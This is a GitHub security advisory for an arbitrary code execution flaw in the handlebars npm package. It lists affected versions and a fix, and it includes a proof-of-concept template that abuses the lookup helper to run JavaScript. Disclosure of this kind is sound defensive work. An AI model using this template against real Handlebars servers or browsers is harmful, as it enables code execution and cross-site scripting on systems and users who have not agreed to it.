# [H] Arbitrary Code Execution in handlebars

## Summary
Severity: High
Advisory: GHSA-2cf5-4w76-r9qv
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:L/I:H/A:L (CVSS_V3)
Published: 2020-09-04
Source: https://github.com/advisories/GHSA-2cf5-4w76-r9qv
Type: github-advisory

## Affected
- npm: `handlebars` — affected >=0 <3.0.8
- npm: `handlebars` — affected >=4.0.0 <4.5.2

## Details
Versions of `handlebars` prior to 3.0.8 or 4.5.2 are vulnerable to Arbitrary Code Execution. The package's lookup helper fails to properly validate templates, allowing attackers to submit templates that execute arbitrary JavaScript in the system. It can be used to run arbitrary code in a server processing Handlebars templates or on a victim's browser (effectively serving as Cross-Site Scripting).

The following template can be used to demonstrate the vulnerability:  
```{{#with "constructor"}}
	{{#with split as |a|}}
		{{pop (push "alert('Vulnerable Handlebars JS');")}}
		{{#with (concat (lookup join (slice 0 1)))}}
			{{#each (slice 2 3)}}
				{{#with (apply 0 a)}}
					{{.}}
				{{/with}}
			{{/each}}
		{{/with}}
	{{/with}}
{{/with}}```


## Recommendation

Upgrade to version 3.0.8, 4.5.2 or later.

## References
- https://www.npmjs.com/advisories/1316
